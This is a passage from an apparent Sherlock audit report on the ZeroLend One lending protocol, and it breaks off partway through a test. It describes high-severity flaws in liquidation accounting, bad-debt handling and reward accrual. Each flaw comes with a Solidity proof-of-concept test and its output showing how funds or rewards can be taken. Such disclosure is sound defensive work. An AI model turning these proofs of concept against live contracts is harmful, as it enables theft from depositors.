    IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);
  }

  // ...

  function _calculateAvailableCollateralToLiquidate(
    DataTypes.ReserveData storage collateralReserve,
    DataTypes.ReserveCache memory debtReserveCache,
    uint256 debtToCover,
    uint256 userCollateralBalance,
    uint256 liquidationBonus,
    uint256 collateralPrice,
    uint256 debtAssetPrice,
    uint256 liquidationProtocolFeePercentage
  ) internal view returns (uint256, uint256, uint256) {
    // ...

    if (liquidationProtocolFeePercentage != 0) {
      vars.bonusCollateral = vars.collateralAmount - vars.collateralAmount.percentDiv(liquidationBonus);
      vars.liquidationProtocolFee = vars.bonusCollateral.percentMul(liquidationProtocolFeePercentage);
      return (vars.collateralAmount - vars.liquidationProtocolFee, vars.debtAmountNeeded, vars.liquidationProtocolFee);  // <==== Audit
    } else {
      return (vars.collateralAmount, vars.debtAmountNeeded, 0);
    }
  }
}
```

[PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L85-L96)
```solidity
  function withdrawCollateral(
    DataTypes.PositionBalance storage self,
    DataTypes.ReserveSupplies storage supply,
    uint256 amount,
    uint128 index
  ) internal returns (uint256 sharesBurnt) {
    sharesBurnt = amount.rayDiv(index);
    require(sharesBurnt != 0, PoolErrorsLib.INVALID_BURN_AMOUNT);
    self.lastSupplyLiquidtyIndex = index;
    self.supplyShares -= sharesBurnt; // <==== Audit
    supply.supplyShares -= sharesBurnt; // <==== Audit
  }
```

When there are protocol liquidation fees, `_burnCollateralTokens` doesn't account for liquidation fees when withrawing the collateral, leading to the pool and actor having more supply shares than reality.

### Internal pre-conditions

Protocol liquidations fees are set.

### External pre-conditions

N/A

### Attack Path
Not an attack path per say as this happens in every liquidation when there are liquidation fees.

1. Alice supplies `tokenA`
2. Bob supplies `tokenB`
3. Alice borrows `tokenB`
4. Alice becomes liquidatable
5. Bob liquidates Alice

### Impact

* Incorrect accounting : pool and actor supply shares are higher than reality, allowing a liquidated actor to borrow more than what they should really be able to for example.
* Pools insolvency : since the liquidation fees are transferred to the treasury from the pool but not reflected on the pool and actor supply shares, the actor can withdraw them again at the expense of other actors. This leads to the other actors not being able to fully withdraw their provided collateral and potentially disrupting functionality such as Curated Vaults reallocation where the withdrawn amount cannot be controlled.

### PoC

#### Test
```solidity
  function testLiquidationWithFees() external {
    poolFactory.setLiquidationProtcolFeePercentage(0.05e4);

    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));
    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, 3000 ether, 0);
    vm.stopPrank();

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);
    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);
    vm.stopPrank();

    oracleB.updateAnswer(2.5e8);

    vm.prank(bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, type(uint256).max);

    assertEq(pool.getBalance(address(tokenA), alice, 0), tokenA.balanceOf(address(pool)));
  }
```

#### Results
```console
forge test --match-test testLiquidationWithFees
[⠢] Compiling...
No files changed, compilation skipped

Ran 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest
[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.25ms (1.62ms CPU time)

Ran 1 test suite in 347.96ms (5.25ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest
[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)

Encountered a total of 1 failing tests, 0 tests succeeded
```

### Mitigation

```diff
diff --git a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol
index e89d626..0a48da6 100644
--- a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol
+++ b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol
@@ -225,7 +225,7 @@ library LiquidationLogic {
     );

     // Burn the equivalent amount of aToken, sending the underlying to the liquidator
-    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex);
+    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate + vars.liquidationProtocolFeeAmount, collateralReserveCache.nextLiquidityIndex);
     IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);
   }
```

# Issue H-6: When bad debt is accumulated, the loss is not shared amongst all suppliers, instead the last to withdraw will experience a huge loss 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/275 

## Found by 
A2-security, Nihavent, Obsidian, joshuajee, tallo
### Summary

When bad debt is accumulated, it should be socialised amongst all suppliers.

The issue is that the protocol does not do this, instead only the last users to withdraw funds will feel the effects of the bad debt.

If a pool experiences bad debt, the first users to withdraw will experience 0 loss, while the last to withdraw will experience a severe loss.

### Root Cause
The [withdrawn](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L106) assets is calculated as `shares * liquidityIndex` which does not take into account bad debt

This means that even if bad debt accrues, the first users to withdraw will be able to withdraw their shares to assets at a good rate, leaving the last users with all the loss. 

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

**This attack path is shown in the PoC:**

1. User A supplies 50 ETH to the pool
2. User B supplies 50 ETH to the pool
3. A bad debt liquidation occurs, so the liquidator only repaid 64 ETH out of the 100 ETH
4. User A is still able to withdraw their 50 ETH
5. User B is left with less than 14 ETH able to be withdrawn

### Impact

Huge fund loss for the suppliers last to withdraw

Early withdrawers effectively steal from the late withdrawers

### PoC

Add the following test to `PoolLiquidationTests.t.sol`

```solidity
function test__BadDebtLiquidationIsNotSocialised() external {
    // Setup users
    address supplierOfTokenB = address(124343434);
    address liquidator = address(8888);
    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); 
    _mintAndApprove(bob, tokenB, 50 ether, address(pool)); 
    _mintAndApprove(supplierOfTokenB, tokenB, 50 ether, address(pool)); 
    _mintAndApprove(liquidator, tokenB, 100 ether, address(pool)); 
    console.log("bob balance before: %e", tokenB.balanceOf(bob));
    // alice supplies 134 ether of tokenA
    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 268 ether, 0); 
    vm.stopPrank();

    // bob supplies 50 ether of tokenB
    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, 50 ether, 0); 
    vm.stopPrank();

    // supplierOfTokenB supplies 50 ether of tokenB
    vm.startPrank(supplierOfTokenB);
    pool.supplySimple(address(tokenB), supplierOfTokenB, 50 ether, 0); 
    vm.stopPrank();

    // alice borrows 100 ether of tokenB
    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, 100 ether, 0); 
    vm.stopPrank();

    // Drops the collateral price to make the position liquidatable
    // the drop is large enough to make the position in bad debt
    oracleA.updateAnswer(5e7); 

    // liquidator liqudiates the position
    // note that he takes all of alice's collateral
    vm.startPrank(liquidator);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 64 ether);

    // bob sees that the position is in bad debt and quickly withdraws all that he supplied
    // bob does not experience any loss from the bad debt
    vm.startPrank(bob);
    pool.withdrawSimple(address(tokenB), bob, 50 ether, 0);

    // supplierOfTokenB tries to withdraw his funds but it reverts, since there is none left
    vm.startPrank(supplierOfTokenB);
    vm.expectRevert();
    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 50 ether, 0);

    // the maximum amount supplierOfTokenB can withdraw is 13 ether of tokenB
    // since that is all that is left in the pool
    pool.withdrawSimple(address(tokenB), supplierOfTokenB, 13 ether, 0);

    // log the final state
    console.log("The following is the final state");

    // show that there is no more tokenB left in the pool after bob withdrew everything
    uint256 PoolBalanceOfB = tokenB.balanceOf(address(pool));
    console.log("Remaining balance of tokenB in the pool = %e", PoolBalanceOfB);

    // show that bob got back the 50 ether he deposited
    uint256 BobBalanceOfB = tokenB.balanceOf(bob);
    console.log("bob's balance of tokenB = %e", BobBalanceOfB);

    // show that supplierOfTokenB only got back 13 ether of tokenB
    uint256 SupplierBalanceOfB = tokenB.balanceOf(supplierOfTokenB);
    console.log("SupplierBalanceOfB balance of tokenB = %e", SupplierBalanceOfB);

    uint256 aliceCollateral = pool.getBalance(address(tokenA), alice, 0);
    console.log("aliceCollateral =%e ", aliceCollateral);
  }
```
**Console output:**

```bash
Ran 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest
[PASS] test__BadDebtLiquidationIsNotSocialised() (gas: 1089597)
Logs:
  The following is the final state
  Remaining balance of tokenB in the pool = 8.09523809523809524e17
  bob's balance of tokenB = 5e19
  SupplierBalanceOfB balance of tokenB = 1.3e19
  aliceCollateral =0e0 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.34ms (1.66ms CPU time)

Ran 1 test suite in 11.14ms (4.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

Socialise the loss among all depositors

# Issue H-7: Liquidated positions will still accrue rewards after being liquidated 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/312 

## Found by 
0xNirix, A2-security, JCN, Obsidian, TessKimy, ZC002, iamnmt, tallo
### Summary

The NFTRewardsDistributor contract which is responsible for managing a users rewards using a masterchef algorithm does not get updated with a users underlying position in a pool is liquidated.  This results in the position wrongfully continuing to accrue rewards with an outdated asset balance.

### Root Cause

The choice to neglect updating the NFTPositionManager contract when a position is liquidated is the root cause of this issue due to the NFTPositionManager contract not containing up-to-date user balances for calculating rewards.

```solidity
  function earned(uint256 tokenId, bytes32 _assetHash) public view returns (uint256) {
    return _balances[tokenId][_assetHash].mul(rewardPerToken(_assetHash).sub(userRewardPerTokenPaid[tokenId][_assetHash])).div(1e18).add(
      rewards[tokenId][_assetHash]
    );
  }
```
The above calculations are done in `NFTRewardsDistributor.sol:98` to determine an NFT positions rewards. Due to this bug, the users balance ```_balances[tokenId][_assetHash]``` will be incorrect, leading to overinflated rewards.
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTRewardsDistributor.sol#L98C1-L102C4
### Internal pre-conditions

1. User needs to have a position NFT registered with the NFTPositionManager contract
2. The NFTPositionManager needs to have rewards accrual enabled for there to be any impact
3. The users NFT position needs to be liquidated due to their position being unhealthy

### External pre-conditions

1. Users collateral assets need to drop in enough in price to make their position liquidatable
2. Any user needs to liquidate the users position

### Attack Path

1. User creates a position
2. The NFTPositionManager contract will start accruing rewards for the user
3. The users position's collateral drops in price enough to make their position unhealthy
4. The user gets liquidated
5. The user will continue to accrue rewards pertaining to their NFT's position for as long as they wish because the NFTPositionManager believes they are still providing collateral and borrowing assets. 
6. The user withdraws their accrued rewards whenever they wish

### Impact

The liquidated user will essentially be able to steal rewards from the protocol/other users since their position won't be backed by any collateral.

### PoC

```solidity
  function test_UserAccruesRewardsWhileLiquidatedBug() public {
    NFTPositionManager _nftPositionManager = new NFTPositionManager();
    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(_nftPositionManager), admin, bytes(''));
    nftPositionManager = NFTPositionManager(payable(address(proxy)));
    nftPositionManager.initialize(address(poolFactory), address(0x123123), owner, address(tokenA), address(wethToken));

    uint256 mintAmount = 100 ether;
    uint256 supplyAmount = 1 ether;
    uint256 tokenId = 1;
    bytes32 REWARDS_ALLOCATOR_ROLE = keccak256('REWARDS_ALLOCATOR_ROLE');

    //approvals
    _mintAndApprove(owner, tokenA, 30e18, address(nftPositionManager));
    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
    _mintAndApprove(bob, tokenB, 2000 ether, address(pool)); // bob 2000 tokenB
    _mintAndApprove(bob, tokenA, 2000 ether, address(pool)); // bob 2000 tokenB

    //grant the pool some rewards
    vm.startPrank(owner);
    nftPositionManager.grantRole(REWARDS_ALLOCATOR_ROLE, owner);
    nftPositionManager.notifyRewardAmount(10e18, address(pool), address(tokenA), false);
    vm.stopPrank();


    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
    INFTPositionManager.AssetOperationParams memory params =
      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 550 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory params2 =
      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 750 ether, 2, data);
    INFTPositionManager.AssetOperationParams memory params3 =
      INFTPositionManager.AssetOperationParams(address(tokenA), bob, 550 ether, 2, data);
    INFTPositionManager.AssetOperationParams memory borrowParams =
      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 100 ether, tokenId, data);

    vm.startPrank(alice);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenA.approve(address(pool), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(params);
    console.log("Alice deposits %e of token A", params.amount);
    vm.stopPrank();

    vm.startPrank(bob);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(pool), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(params2);
    nftPositionManager.supply(params3);
    console.log("Bob deposits %e of token A", params3.amount);
    vm.stopPrank();

    vm.prank(alice);
    nftPositionManager.borrow(borrowParams);


    bytes32 assetHashA = nftPositionManager.assetHash(address(pool), address(tokenA), false);
    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
    console.log("\nAlice rewards earned before liquidation: %e", nftPositionManager.earned(1, assetHashA));
    console.log("Bob rewards earned before Alice is Liquidated: %e\n", nftPositionManager.earned(2, assetHashA));
    oracleA.updateAnswer(3e5);
    vm.prank(bob);
    console.log("Bob liquidates Alice");
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 550 ether);
    console.log("Skip ahead until end of rewards cycle...");
    vm.warp(block.timestamp+14 days);

    console.log("\nAlice rewards earned after liquidation: %e", nftPositionManager.earned(1, assetHashA));
    console.log("Bob rewards earned after Alice is liquidated: %e", nftPositionManager.earned(2, assetHashA));
    console.log("Alice rewards equal to Bob rewards: ", nftPositionManager.earned(1, assetHashA) == nftPositionManager.earned(2, assetHashA));

  }
```
#### Logs
Output:
  Alice deposits 5.5e20 of token A
  Bob deposits 5.5e20 of token A

  Alice rewards earned before liquidation: 0e0
  Bob rewards earned before Alice is Liquidated: 0e0

  Bob liquidates Alice
  Skip ahead until end of rewards cycle...

  Alice rewards earned after liquidation: 4.99999999999953585e18
  Bob rewards earned after Alice is liquidated: 4.99999999999953585e18
  Alice rewards equal to Bob rewards:  true

The PoC shows that even though Alice was liquidated, she continued to accrue the same amount of rewards as Bob over the time period.

### Mitigation

When necessary, the liquidation function should callback to the NFT position contract to update the liquidated users position with the contract so they don't continue to accrue rewards.

# Issue H-8: Liquidations do not target the lowest LTV tokens leading to a position losing health 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/335 

## Found by 
imsrybr0, joshuajee, silver\_eth, tallo
### Summary

When users liquidate a position, they are able to choose one debt asset to pay off and one asset of the users to seize for a discount. Since there are no restrictions on which collateral asset a user can seize, they can choose a high LTV asset that will often lower a positions health.

### Root Cause

The liquidation mechanism does not prioritize the lowest LTV assets when liquidating. Liquidators are given the ability to choose the safer higher LTV assets as collateral to seize which results in the positions health dropping.

Example:
Consider a position with collateral asset A, C and debt asset B and a 0% liquidation bonus. A is a safe asset with a liquidation LTV of 90% while C is a risky asset with a liquidation LTV of 50%. If the position has 1000 USDC of A and 1000 USDC of C then their total borrowing power is (1000*.90 + 1000*.5) = $1500 total borrowing power. If the position has a debt value greater than $1500 they will be liquidated. Consider the case where they have $1600 in debt, A positions health is calculated as:

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L141C1-L143

```HealthFactor = (average liquidation LTV) * (total collateral value) / (total debt value)```
```HealthFactor = (1000*.90+1000*.5)/(1600) = 1500/1600 = .875```
Since ```HealthFactor < 1``` then the position is liquidatable. If the liquidator were to seize asset A to pay off $1000 of debt then the new ```HealthFactor``` is:
```HealthFactor = (1000*.5)/(600) = 5/6 = .83333```
Even with a 0% liquidation bonus, the positions ```HealthFactor``` decreased from .875 to .8333 after liquidation and the position is even more at risk of creating bad debt.


### Internal pre-conditions

1. User has to have a position with multiple collateral assets of varying LTV's and is borrowing an asset
2. the user has to be liquidated
3. the liquidator has to seize the higher LTV asset

### External pre-conditions

1. user collateral has to drop enough in price to be liquidatable
2. user has to get liquidated

### Attack Path

1. User has a position with multiple collateral assets of varying LTV's and is borrowing an asset
2. The positions health factor drops below 1
3. The liquidator liquidates the position and chooses the higher LTV (safer) asset
4. Liquidator

### Impact

Two main impacts:
1. The protocol is at greater risk of bad debt and in some cases is guaranteed bad debt.
2. The liquidator can bypass partial liquidation checks (.95 < HF < 1) by liquidating once and causing the HF to decrease below .95. The liquidator can then liquidate again to seize the rest of their collateral.

### PoC

Steps:
1. set the ```PoolSetup.sol#_basicPoolInitParams``` function to the following. This is to change the LTV's/liquidation thresholds of the assets.
```solidity
  function _basicPoolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {

    address[] memory assets = new address[](4);
    assets[0] = address(tokenA);
    assets[1] = address(tokenB);
    assets[2] = address(tokenC);
    assets[3] = address(wethToken);

    address[] memory rateStrategyAddresses = new address[](4);
    rateStrategyAddresses[0] = address(irStrategy);
    rateStrategyAddresses[1] = address(irStrategy);
    rateStrategyAddresses[2] = address(irStrategy);
    rateStrategyAddresses[3] = address(irStrategy);

    address[] memory sources = new address[](4);
    sources[0] = address(oracleA);
    sources[1] = address(oracleB);
    sources[2] = address(oracleC);
    sources[3] = address(oracleD);

    DataTypes.InitReserveConfig memory config = _basicConfig();

    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](4);
    DataTypes.InitReserveConfig memory configA = DataTypes.InitReserveConfig({
      ltv: 9000,
      liquidationThreshold: 9500,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });

    DataTypes.InitReserveConfig memory configC = DataTypes.InitReserveConfig({
      ltv: 5000,
      liquidationThreshold: 8000,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });
    configurationLocal[0] = configA;
    configurationLocal[1] = config;
    configurationLocal[2] = configC;
    configurationLocal[3] = config;

    address[] memory admins = new address[](1);
    admins[0] = address(this);

    p = DataTypes.InitPoolParams({
      proxyAdmin: address(this),
      revokeProxy: false,
      admins: admins,
      emergencyAdmins: new address[](0),
      riskAdmins: new address[](0),
      hook: address(0),
      assets: assets,
      rateStrategyAddresses: rateStrategyAddresses,
      sources: sources,
      configurations: configurationLocal
    });
  }
```
2. place the following test inside ```NFTPositionManagerTest.t.sol```
```solidity
  function test_LiquidateHealthyAssetBug() public {
    uint256 mintAmount = 100 ether;
    uint256 supplyAmount = 1 ether;
    uint256 tokenId = 1;

    //approvals
    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
    _mintAndApprove(alice, tokenB, 1000 ether, address(pool)); // alice 1000 tokenB
    _mintAndApprove(alice, tokenC, 1000 ether, address(pool)); // alice 1000 tokenC
    _mintAndApprove(bob, tokenB, 5000 ether, address(pool)); // bob 2000 tokenB


    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
    INFTPositionManager.AssetOperationParams memory aliceSupplyA =
      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 1000 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory aliceSupplyC =
      INFTPositionManager.AssetOperationParams(address(tokenC), alice, 1000 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory aliceBorrowB =
      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 1390 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory bobSupplyB =
      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 2000 ether, 2, data);
    oracleA.updateAnswer(1e8);
    oracleB.updateAnswer(1e8);
    oracleC.updateAnswer(1e8);

    vm.startPrank(alice);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(aliceSupplyA);
    nftPositionManager.supply(aliceSupplyC);
    vm.stopPrank();

    vm.startPrank(bob);
    tokenA.approve(address(pool), 100000 ether);
    tokenB.approve(address(pool), 100000 ether);
    tokenC.approve(address(pool), 100000 ether);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(bobSupplyB);
    vm.stopPrank();

    vm.startPrank(alice);
    nftPositionManager.borrow(aliceBorrowB);
    vm.stopPrank();

    oracleC.updateAnswer(5000e4);
    (,,,,uint256 currentLTV,uint256 healthFactorBefore) = pool.getUserAccountData(address(nftPositionManager), 1);
    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
    console.log("\n========================\n");
    console.log("alice HF before liquidation: %e", healthFactorBefore);
    console.log("alice LTV before liquidation: %e\n", currentLTV);

    console.log("Liquidating...");
    vm.startPrank(bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);

    (,,,,uint256 afterLTV,uint256 healthFactorAfter) = pool.getUserAccountData(address(nftPositionManager), 1);
    console.log("\nalice HF after liquidation: %e", healthFactorAfter);
    console.log("alice LTV after liquidation: %e", afterLTV);
    vm.stopPrank();
  }
```

#### Output
  alice HF before liquidation: 9.71223021582733813e17
  alice LTV before liquidation: 7.666e3

  Liquidating...

  alice HF after liquidation: 9.44913884892086331e17
  alice LTV after liquidation: 6.403e3

The PoC shows a decrease in HF from .971 to .944 along with a decrease in LTV.

### Mitigation

Liquidation should prioritize the lowest LTV/riskiest assets first.

# Issue H-9: Partial liquidations can sometimes lower a positions health and lead to guaranteed bad debt 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/338 

## Found by 
coffiasd, joshuajee, tallo, trachev
### Summary

Partial liquidations are allowed when a users healthFactor ```.95 < healthFactor < 1```. When users have a single asset as collateral this often leads to a position having a decreased health factor after liquidation. The user can be repeatedly liquidated and the protocol guaranteed bad debt.

### Root Cause
The cases where a position's health factor decreases can be derived as follows:
Partial liquidation percent: 50%
Liquidator discount K: 5%
C: initial collateral value
D: initial debt value
LT: Liquidation threshold
Initial Health factor = (C * LT) / D < 1
After partial Liquidation:
New Debt: D' = D * 0.5
Liquidated Collateral: L = (D * 0.5)/(1 - K)
New Collateral: C' = C-L
New Health Factor = (C' * LT)/D'
For the health factor to increase the following inequality must hold:
(C' * LT) / D' > (C * LT) / D
(C - L)  > C * 0.5
 (C - (D * 0.5)/(1 - K) > C * 0.5
-(D * 0.5 / (1 -  K)) > -C * 0.5
D * 0.5 / (1 - K) < C * 0.5
D / (1 - K) < C
(1 - K ) > D / C
C / D > 1 / (1 - K) 
In other words, liquidation only leads to an increase in the health factor when there is enough collateral to pay off the discount. This inequality is more likely to be unsatisfied with higher LTV assets since the C / D value will be lower.

### Internal pre-conditions
1. User must be liquidatable (HF < 1)
2. If the following inequality doesn't hold, then the liquidation will cause a decrease in health factor.
C / D > 1 / (1 - K) 

### External pre-conditions

1. A users collateral must drop in price sufficiently for them to be liquidatable

### Attack Path

1. User position health factor drops below 1
2. User gets partially liquidated
3. Liquidation decreases the health factor
4. Liquidation is repeated until all collateral drained and only bad debt remains

### Impact

1. A position will end up less healthy after liquidation than before. This will lead to repeated liquidations and guaranteed accrual of bad debt for the protocol. This issue is more prevalent in higher LTV (safer) assets since the C / D ratio will be lower.
2. The partial liquidation mechanism can be bypassed since the liquidation mechanisms intention is to increase a positions HF beyond 1. However, this doesn't happen in this edge case so a previously liquidated position can still be liquidatable and can be repeatedly liquidated. Essentially bypassing the following close factor limitations:
https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L266C1-L267C1
```solidity    
uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;
```
### PoC
1. set the PoolSetup.sol#_basicPoolInitParams function to the following. This is to change the LTV's/liquidation thresholds of the assets.
```solidity
  function _basicPoolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {

    address[] memory assets = new address[](4);
    assets[0] = address(tokenA);
    assets[1] = address(tokenB);
    assets[2] = address(tokenC);
    assets[3] = address(wethToken);

    address[] memory rateStrategyAddresses = new address[](4);
    rateStrategyAddresses[0] = address(irStrategy);
    rateStrategyAddresses[1] = address(irStrategy);
    rateStrategyAddresses[2] = address(irStrategy);
    rateStrategyAddresses[3] = address(irStrategy);

    address[] memory sources = new address[](4);
    sources[0] = address(oracleA);
    sources[1] = address(oracleB);
    sources[2] = address(oracleC);
    sources[3] = address(oracleD);

    DataTypes.InitReserveConfig memory config = _basicConfig();

    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](4);
    DataTypes.InitReserveConfig memory configA = DataTypes.InitReserveConfig({
      ltv: 9000,
      liquidationThreshold: 9500,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });

    DataTypes.InitReserveConfig memory configC = DataTypes.InitReserveConfig({
      ltv: 5000,
      liquidationThreshold: 8000,
      liquidationBonus: 10_500,
      decimals: 18,
      frozen: false,
      borrowable: true,
      borrowCap: 0,
      supplyCap: 0
    });
    configurationLocal[0] = configA;
    configurationLocal[1] = config;
    configurationLocal[2] = configC;
    configurationLocal[3] = config;

    address[] memory admins = new address[](1);
    admins[0] = address(this);

    p = DataTypes.InitPoolParams({
      proxyAdmin: address(this),
      revokeProxy: false,
      admins: admins,
      emergencyAdmins: new address[](0),
      riskAdmins: new address[](0),
      hook: address(0),
      assets: assets,
      rateStrategyAddresses: rateStrategyAddresses,
      sources: sources,
      configurations: configurationLocal
    });
  }
```
2. place the following test inside NFTPositionManagerTest.t.sol
```solidity
  function test_doubleLiquidateBug() public {
    uint256 mintAmount = 100 ether;
    uint256 supplyAmount = 1 ether;
    uint256 tokenId = 1;

    //approvals
    _mintAndApprove(alice, tokenA, 1000 ether, address(pool)); // alice 1000 tokenA
    _mintAndApprove(alice, tokenB, 1000 ether, address(pool)); // alice 1000 tokenB
    _mintAndApprove(alice, tokenC, 1000 ether, address(pool)); // alice 1000 tokenC
    _mintAndApprove(bob, tokenB, 5000 ether, address(pool)); // bob 2000 tokenB


    DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
    INFTPositionManager.AssetOperationParams memory aliceSupplyA =
      INFTPositionManager.AssetOperationParams(address(tokenA), alice, 1000 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory aliceBorrowB =
      INFTPositionManager.AssetOperationParams(address(tokenB), alice, 750 ether, tokenId, data);
    INFTPositionManager.AssetOperationParams memory bobSupplyB =
      INFTPositionManager.AssetOperationParams(address(tokenB), bob, 2000 ether, 2, data);
    oracleA.updateAnswer(1e8);
    oracleB.updateAnswer(1e8);

    vm.startPrank(alice);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(aliceSupplyA);
    vm.stopPrank();

    vm.startPrank(bob);
    tokenA.approve(address(pool), 100000 ether);
    tokenB.approve(address(pool), 100000 ether);
    tokenC.approve(address(pool), 100000 ether);
    tokenA.approve(address(nftPositionManager), 100000 ether);
    tokenB.approve(address(nftPositionManager), 100000 ether);
    tokenC.approve(address(nftPositionManager), 100000 ether);
    nftPositionManager.mint(address(pool));
    nftPositionManager.supply(bobSupplyB);
    vm.stopPrank();

    vm.startPrank(alice);
    nftPositionManager.borrow(aliceBorrowB);
    vm.stopPrank();

    uint256 balanceBefore = tokenA.balanceOf(bob);
    oracleA.updateAnswer(7800e4);

    (uint256 collBeforeAnyLiquidation,uint256 debtBeforeAnyLiquidation,,,,uint256 healthFactorBeforeAnyLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
    uint256 ratioBeforeAnyLiquidation = debtBeforeAnyLiquidation*1e18/collBeforeAnyLiquidation;
    console.log("d / c < .95 => %e / %e = %e", debtBeforeAnyLiquidation,collBeforeAnyLiquidation, ratioBeforeAnyLiquidation);
    console.log("ratio < 0.95 => %e < %e => %s", ratioBeforeAnyLiquidation, 0.95e18, ratioBeforeAnyLiquidation < 0.95e18);

    bytes32 pos = keccak256(abi.encodePacked(nftPositionManager, 'index', uint256(1)));
    console.log("alice HF before any liquidations: %e\n", healthFactorBeforeAnyLiquidation);


    vm.startPrank(bob);
    //stack too deep prevention
    {
            pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10000e18);
            uint256 balanceAfterFirstLiquidation = tokenA.balanceOf(bob);
            (uint256 collAfterFirstLiquidation,uint256 debtAfterFirstLiquidation,,,,uint256 healthFactorAfterFirstLiquidation) = pool.getUserAccountData(address(nftPositionManager), 1);
